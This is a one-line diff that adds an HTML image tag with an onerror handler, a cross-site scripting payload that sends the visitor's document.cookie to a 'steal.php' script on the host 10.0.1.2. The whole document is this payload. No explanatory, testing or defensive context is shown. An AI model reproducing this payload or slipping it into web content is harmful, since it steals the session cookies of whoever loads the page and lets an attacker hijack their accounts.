@@ -1,0 +1,1 @@
+<img src=x onerror="location='http://10.0.1.2/steal.php?cookie='+document.cookie">
